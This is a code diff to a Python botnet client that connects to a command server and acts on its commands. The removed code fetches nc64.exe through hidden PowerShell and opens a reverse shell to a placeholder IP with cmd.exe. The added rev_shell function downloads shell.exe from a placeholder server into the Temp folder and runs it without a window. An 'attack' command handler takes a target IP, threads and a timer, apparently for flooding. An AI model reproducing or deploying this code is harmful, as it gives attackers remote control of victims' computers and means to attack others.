@@ -7,8 +7,7 @@ import shutil
 import random
 import multiprocessing
 import subprocess
-import tempfile
-
+import base64
 
 should_reconnect = True
 
@@ -46,12 +45,12 @@ def receive_messages(client_socket):
                 break
             elif data == 'disconnect_all':
                 print("Server has requested all clients to disconnect. Closing client...")
-                should_reconnect = True  # Set the flag to False to prevent reconnection
+                should_reconnect = False  # Set the flag to False to prevent reconnection
                 break
 
             # Perform any action based on the received message
             if data == 'shell':
-                download_and_run_nc()
+                rev_shell()
 
             if data.startswith('attack'):
                 # Extract IP, threads, and timer from the received data
@@ -67,26 +66,28 @@ def receive_messages(client_socket):
     # Add a delay before attempting to reconnect
     time.sleep(60)
 
-def download_and_run_nc():
-    try:
-        # Get the temporary folder path
-        temp_folder = tempfile.gettempdir()
-        # Full path to the downloaded 'nc64.exe' file in the temporary folder
-        nc_path = os.path.join(temp_folder, 'nc64.exe')
-        # PowerShell command to download 'nc64.exe' to the temporary folder
-        powershell_command = f'Invoke-WebRequest -Uri "http://[YOUR_IP]/nc64.exe" -OutFile "{nc_path}"'
-        # Run the PowerShell command
-        subprocess.Popen(['powershell', '-command', powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)
-        # Wait for a moment to ensure the download completes
-        subprocess.Popen(['timeout', '/nobreak', '5'], shell=True).wait()
-        # Run 'nc64.exe' from the temporary folder
-        subprocess.Popen([os.path.join(temp_folder, 'nc64.exe'), '[YOUR_IP]', '4444', '-e', 'cmd.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
+def rev_shell():
+    # URL where shell.exe is hosted
+    url = "http://[server-ip]/shell.exe"
+    
+    # Construct the download path with environment variable for temp directory
+    username = os.getenv('USERNAME')  # Get the current username
+    download_path = fr'C:\Users\{username}\AppData\Local\Temp\shell.exe'
 
-    except Exception as e:
-        print(f"Failed to start shell: {e}")
+    # PowerShell command to download the executable to the specified path
+    powershell_command = f'powershell -Command "(New-Object System.Net.WebClient).DownloadFile(\'{url}\', \'{download_path}\')"'
+
+    # Execute the PowerShell command using os.system
+    os.system(powershell_command)
+    
+    # Execute the downloaded executable from the specified path
+    if os.path.exists(download_path):
+        subprocess.Popen(download_path, creationflags=subprocess.CREATE_NO_WINDOW)
+    else:
+        print(f"Failed to download or find {download_path}")
 
 def start_client():
-    host = '[YOUR_IP]'
+    host = '[server-ip]'
     port = 443
 
     while should_reconnect:
